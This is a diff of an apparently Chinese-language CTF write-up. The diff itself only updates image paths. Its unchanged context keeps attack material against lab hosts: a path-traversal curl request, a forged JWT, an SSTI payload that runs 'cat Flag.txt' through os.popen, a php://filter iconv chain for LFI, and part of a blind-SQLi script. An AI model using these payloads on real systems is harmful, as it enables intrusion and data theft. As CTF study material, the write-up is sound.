@@ -8,7 +8,7 @@ hidden: false
 
 ## Space game
 
-![](/images/2023/09/NGqkYHQ.png)
+![](/images/2023/12/NGqkYHQ.png)
 
 
 
@@ -33,18 +33,18 @@ curl http://10.99.111.108:1995/img.php?img=$(printf ..../..../..../..../..../...
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYm9zcyIsImhhY2siOiIxIn0.I3Y1_hvlr07xOmOyZK8vVjzxEfdxtnPfm7lT9TGgxps
 ```
-![](/images/2023/09/PuvWEtY.png)
+![](/images/2023/12/PuvWEtY.png)
 
 - SSTI
 ```
 http://10.99.111.109:5000/boss?data=%7B%27user_id%27%3A+1,+%27role%27%3A+%27boss%27,+%27hack%27%3A+%27%7B%7Bnamespace.__init__.__globals__.os.popen("cat Flag.txt").read()%7D%7D%27%7D
 ```
-![](/images/2023/09/4Bg8ADV.png)
+![](/images/2023/12/4Bg8ADV.png)
 
 ## babyLFI
 
 - result
-![](/images/2023/09/SlcFlxn.png)
+![](/images/2023/12/SlcFlxn.png)
 
 - 繞過preg_match
 
@@ -83,11 +83,11 @@ filename#=php://filter/(a*1000000)/convert.iconv.UTF8.CSISO2022KR|convert.base64
 ## Flag Slot Machine
 
  - 有SQLI，是boolean要用二分法
-    ![](/images/2023/09/RgiSuBB.png)
+    ![](/images/2023/12/RgiSuBB.png)
 
  - 每3分鐘會reset key
 
-    ![](/images/2023/09/PUEROH3.png)
+    ![](/images/2023/12/PUEROH3.png)
 
 ```python
 import requests_go
@@ -139,7 +139,7 @@ for i in range(32):
         exit()
 
 ```
-![](/images/2023/09/AHqMcBu.png)
+![](/images/2023/12/AHqMcBu.png)
 
 
 ## Link list
@@ -148,24 +148,24 @@ for i in range(32):
 
 ### first
 - ink long name
-![](/images/2023/09/72pFOrZ.png)
+![](/images/2023/12/72pFOrZ.png)
 
 ### second
 ```LECmd.exe -d ../aa/ --all > test.txt```
 - ink short name
-![](/images/2023/09/xTBxmYc.png)
+![](/images/2023/12/xTBxmYc.png)
 
 ### third
 
 
-![](/images/2023/09/l2MkjFS.png)
+![](/images/2023/12/l2MkjFS.png)
 
 
-![](/images/2023/09/7pEJDAP.png)
+![](/images/2023/12/7pEJDAP.png)
 
 ### last
  - 直接string
-![](/images/2023/09/XnqoBGT.png)
+![](/images/2023/12/XnqoBGT.png)
 
 
 
@@ -174,4 +174,4 @@ CGGC{3z_f1r57_qu4r73r_57ruc7ur3s_f0r_53c0nd_m4l1c10u5_7h1rd_0n3_l457_p4r7_15_h1d
 
 ## result
 
-![](/images/2023/09/yUZ1QOs.png)
+![](/images/2023/12/yUZ1QOs.png)
